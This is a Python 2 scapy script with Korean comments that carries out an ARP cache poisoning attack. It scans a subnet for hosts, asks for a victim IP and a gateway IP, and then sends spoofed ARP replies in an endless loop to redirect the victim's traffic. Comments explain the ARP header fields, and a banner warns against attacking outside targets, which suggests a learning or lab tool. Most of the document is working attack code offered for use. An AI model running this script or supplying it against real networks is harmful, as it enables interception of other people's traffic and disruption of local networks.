#!/usr/bin/env python
# -*- coding: utf-8 -*-

# "#!"은 2Byte의 매직넘버(magic number)로 이 스크립트를 실행시켜줄 프로그램의 경로를 지정한다.
# env는 환경 변수에서 지정한 언어의 위치를 찾아서 실행됩니다.

import socket, subprocess, sys
from logging import getLogger, ERROR # Import Logging Things (로깅기능을 수행하기 위해 모듈을 불러온다.)
getLogger("scapy.runtime").setLevel(ERROR) # Get Rid if IPv6 Warning (IPv6에 대한 경고를 없앤다.)
from scapy.all import * # 모든 scapy 모듈을 불러온다.
import time # sleep 적용하기 위해 time 모듈을 불러온다.
#from termcolor import colored # print 에 컬러 적용을 위해 모듈을 불러온다.

subprocess.call('clear',shell=True) # 콘솔명령어를 적용함
print """
\033[1;34m
                      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                     /  /################################################################\  \
                    /  /        ._________    _  ___________  __________  ____           \  \
                   /  /         |   |/  /     |__   __|       |   |__|  |                  \  \
                  /  /          |   /  /        |\ /|         |   /__\  |                   \  \
                  \  \          |   \  \        |/ \|         |   /__ \ |                   /  /
                   \  \         | __|\__\       |\_/|         /__/|  |_\|                  /  /
                    \  \        /\      \\/      //    \/        //      /\  \\/          /  /
                     \  \$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$/  /
                      ######################################################################
\033[1;m
                                                \033[1;41mMAKE BY KIMTAEKHAN\033[1;m


                                                  \033[1;44m[!] 경고 !!!!!\033[1;m
                                     \033[1;44m함부로 외부에다가 공격시도 하지마세요 !!!!!\033[1;m

"""

############ 시간 설정 ############
time_counter=1.00 # 시간 설정 1초
###################################

################## 공격 설정  ##################
try:
        targets = raw_input("\033[1;48m[*] 공격 목표의 주소를 입력하세요 - >\033[1;m \033[1;33m") # 공격 목표의 주소입력.

except KeyboardInterrupt: #사용자가 프로그램을 종료하고자 할때 키보드의 입력에 따른 메세지를 출력.
       print "\n\n\033[1;m \033[1;35m[!]\033[1;m\033[1;36m공격자의 명령에 의해 프로그램을 종료합니다.\033[1;m\n" # 메세지 출력
       print "\033[1;31m[!]\033[1;m \033[1;33m종료중\033[1;m" # 메세지 출력
       print "\033[1;34m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;35m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;36m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\n\033[1;32m[!]\033[1;m \033[1;38m완료 !!\033[1;m" # 메세지 출력
       sys.exit(1) # 종료

conf.verb = 0 # 동작간 메세지 출력하지 않음
target = (targets + "/24")
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target),timeout=2)
#print colored('####################### 찾은 MAC 주소 #######################', 'red')
print '\033[1;31m####################### 찾은 MAC 주소 #######################\033[1;m' # 메세지 출력
ans.summary(lambda (s,r): r.sprintf("\033[1;44m%Ether.src% %ARP.psrc%\033[1;m"))
#print colored("#############################################################", "red")
print "\033[1;31m#############################################################\033[1;m" # 메세지 출력

try :

                #hacker_ip = raw_input("\033[1;36m[*] 해커의 아이피를 입력하세요 - > \033[1;m \033[1;33m")
                # 공격자의 IP 주소 입력.
                victim_ip = raw_input("\033[1;36m[*] 공격할 아이피를 입력하세요 - > \033[1;m \033[1;33m")
                # 피해자의 IP주소 입력.
                #victim_mac = raw_input("\033[1;36m[*] 공격할 MAC 주소를 입력하세요 - > \033[1;m \033[1;33m")
                # 피해자의 MAC주소 입력.
                gateway_ip = raw_input("\033[1;36m[*] 게이트 웨이의 아이피 주소를 입력하세요 - > \033[1;m \033[1;33m")
                # 게이트 웨이 IP주소 입력.
except KeyboardInterrupt: #사용자가 프로그램을 종료하고자 할때 키보드의 입력에 따른 메세지를 출력.
       print "\n\n\033[1;m \033[1;35m[!]\033[1;m\033[1;36m공격자의 명령에 의해 프로그램을 종료합니다.\033[1;m\n" # 메세지 출력
       print "\033[1;31m[!]\033[1;m \033[1;33m종료중\033[1;m" # 메세지 출력
       print "\033[1;34m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;35m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\033[1;36m   .\033[1;m" # 메세지 출력
       time.sleep(time_counter) # 설정 시간 적용
       print "\n\033[1;32m[!]\033[1;m \033[1;38m완료 !!\033[1;m" # 메세지 출력
       sys.exit(1) # 종료

print "\033[1;41m ARP 캐시 포이즈닝 공격을 시작합니다 !!!! \033[1;m"

##################################### ARP 프로토콜 헤더 #####################################
#                                                                                       #
#                  하드웨어 타입                				프로토콜 타입                        #
#       하드웨어 주소 길이 / 프로토콜 주소 길이                            Opcode                   #
#                                     송신 하드웨어 주소                                      #
#                                     송신 프로토콜 주소                                      #
#                                     수신 하드웨어 주소                                      #
#                                     수신 프로토콜 주소                                      #
#                                                                                       #
#########################################################################################

hardwaretype=1                  # 하드웨어 타입
protocoltype=2048               # 프로토콜 타입
hardwarelength=6                # 하드웨어 주소 길이
protocollength=4                # 프로토콜 주소 길이
opcode=2                                # Opcode
# inter=RandNum(10,40), loop=1 는 10~40중 랜덤하게 반복해서 패킷을 보내라는 의미이다.
# ARP의 취약점중 하나로 사용자를 제대로 인증하지 못한다.

send(ARP(hwtype=hardwaretype, ptype=protocoltype, hwlen=hardwarelength, plen=protocollength, op=opcode,pdst=victim_ip,psrc=gateway_ip),inter=RandNum(10,40), loop=1 )

#hwdst=victim_mac 옵션에서 제외 추가하려면 gateway_ip 뒤에 옵션을 붙여준다.

#############################################################################################
#1. 하드웨어 주소 타입 ( Hardware address Type )  - 2 byte                                        #
#- 하드웨어 종류 필드 값은 H/W Address Length 필드의 설정을 제어한다.                                      #
#이더넷 :1                                                                                     #
#HDLC : 17                                                                                   #
#SMDS : 14                                                                                   #
#F/R : 15                                                                                  #
#                                                                                          #
#2. 프로토콜 주소 타입 ( Protocol address Type )  - 2 byte                                          #
#- 프로토콜 종류는 해당 하드웨어 주소로 제공되는 상위 계층 프로토콜 주소.                           #
#IP : 0800                                                                                          #
#X.25 : 0805                                                                                        #
#                                                                                                   #
#3. 하드웨어 주소 길이 ( H/W Address Length )   - 1 byte                                            #
#- MAC 주소의 길이 : 6                                                                              #
#                                                                                                   #
#4. 프로토콜 주소 길이 ( Protocol Address Length )  - 1 byte                                        #
##- 프로토콜 주소의 길이 ( IP 주소의 길이 ) : 4                                                     #
#                                                                                                   #
#5. Operation ( Opcode )   - 2 byte                                                                 #
#- 요청 패킷인지 응답 패킷인지를 말한다.                                                            #
#ARP 요청 ( request )  : 0001                                                                       #
#ARP 응답 ( reply )    : 0002                                                                       #
#RARP 요청   : 0003                                                                                 #
#RARP 응답   : 0004                                                                                 #
#                                                                                                   #
#6. 출발지 MAC 주소 ( Source Hardware Address  ) - 6 byte                                           #
#- 보내는 곳의 MAC 주소                                                                             #
#                                                                                                   #
##7.  출발지의 Protocol 주소, IP 주소 ( Source Protocol Address )  - 4 byte                         #
#- 보내는 곳의 Protocol, IP 주소                                                                    #
#                                                                                                   #
#8. 목적지의 MAC 주소 ( Target Hardware Address )  - 6 byte                                         #
#- 받는 곳의 MAC 주소                                                                               #
#- 처음 통신하는 패킷은 MAC 주소가 비어있다.                                                        #
#왜냐하면, 목적지의 IP 주소로 목적지의 MAC 주소를 알아내기 위함이 ARP의 목적이기 때문이다.      #
#                                                                                                   #
#9. 목적지의 Protocol 주소, IP 주소 ( Target Protocol Address  )  - 4 byte                          #
#- 목적지의 Protocol, IP 주소                                                                       #
#############################################################################################
